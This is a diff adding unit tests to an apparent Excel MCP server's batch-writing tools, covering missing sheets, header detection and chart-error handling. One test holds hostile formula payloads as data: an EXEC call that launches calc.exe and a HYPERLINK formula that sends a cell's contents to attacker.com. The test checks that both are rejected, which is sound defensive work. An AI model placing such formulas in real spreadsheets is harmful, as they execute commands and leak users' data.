@@ -14,7 +14,9 @@ from excel_mcp.core.batch import (
     build_single_pass_workbook,
     inspect_workbook_outline,
 )
+from excel_mcp.core.calculations import FormulaSecurityError
 from excel_mcp.core.presets import PRESETS, get_preset
+from excel_mcp.exceptions.exception_core import SheetNotFoundError
 from excel_mcp.tools.batch_tools import (
     batch_write_data,
     build_workbook,
@@ -144,6 +146,93 @@ class TestBatchTools(unittest.TestCase):
         self.assertEqual(ws["C5"].value, 100)
         self.assertEqual(ws["B6"].value, "Data 2")
         self.assertEqual(ws["C6"].value, 200)
+
+    def test_batch_write_invalid_sheet_name_raises(self) -> None:
+        """Verify batch_write_matrix raises SheetNotFoundError if sheet does not exist."""
+        wb_path = os.path.join(self.temp_dir.name, "missing_sheet.xlsx")
+        build_single_pass_workbook(
+            filename=wb_path,
+            sheets=[{"name": "ValidSheet", "rows": [[1]]}],
+        )
+        with self.assertRaises(SheetNotFoundError):
+            batch_write_matrix(
+                filename=wb_path,
+                sheet_name="NonExistentSheet",
+                start_cell="A1",
+                data_matrix=[[10]],
+            )
+
+    def test_formula_injection_prevention(self) -> None:
+        """Verify dangerous formula patterns are rejected in batch matrix and build."""
+        wb_path = os.path.join(self.temp_dir.name, "formula_sec.xlsx")
+        build_single_pass_workbook(
+            filename=wb_path,
+            sheets=[{"name": "SecSheet", "rows": [[1]]}],
+        )
+
+        # 1. Reject dangerous functions in batch_write_matrix
+        with self.assertRaises(FormulaSecurityError):
+            batch_write_matrix(
+                filename=wb_path,
+                sheet_name="SecSheet",
+                start_cell="A1",
+                data_matrix=[['=EXEC("calc.exe")']],
+            )
+
+        # 2. Reject injection patterns in build_single_pass_workbook
+        with self.assertRaises(FormulaSecurityError):
+            build_single_pass_workbook(
+                filename=os.path.join(self.temp_dir.name, "bad_build.xlsx"),
+                sheets=[
+                    {
+                        "name": "Exploit",
+                        "rows": [['=HYPERLINK("http://attacker.com?data=" & A1)']],
+                    }
+                ],
+            )
+
+    def test_outline_header_detection_with_title_banner(self) -> None:
+        """Verify outline inspection detects headers on row 3 when row 1 is a title banner."""
+        wb_path = os.path.join(self.temp_dir.name, "banner_outline.xlsx")
+        build_single_pass_workbook(
+            filename=wb_path,
+            sheets=[
+                {
+                    "name": "Report",
+                    "title": "EXECUTIVE SUMMARY",
+                    "headers": ["Department", "Budget", "Actual"],
+                    "rows": [["IT", 50000, 48000]],
+                }
+            ],
+        )
+
+        outline = inspect_workbook_outline(wb_path)
+        sheet = outline.sheets[0]
+        self.assertEqual(sheet.header_row, 3)
+        self.assertEqual(sheet.headers, ["Department", "Budget", "Actual"])
+
+    def test_chart_failure_does_not_corrupt_sheet_cells(self) -> None:
+        """Verify chart rendering exceptions produce warnings without polluting sheet cells."""
+        wb_path = os.path.join(self.temp_dir.name, "chart_warn.xlsx")
+        build_single_pass_workbook(
+            filename=wb_path,
+            sheets=[
+                {
+                    "name": "ChartSheet",
+                    "headers": ["A", "B"],
+                    "rows": [[1, 2]],
+                    "chart": {"type": "bar", "data_column": 999},  # out of bounds column
+                }
+            ],
+        )
+        self.assertTrue(os.path.exists(wb_path))
+        wb = openpyxl.load_workbook(wb_path)
+        ws = wb["ChartSheet"]
+        for row in ws.iter_rows(values_only=True):
+            for cell_val in row:
+                if cell_val is not None:
+                    self.assertNotIn("Chart generation error", str(cell_val))
+        wb.close()
 
     def test_tool_wrapper_security(self) -> None:
         """Verify MCP batch tool security rejects forbidden paths."""
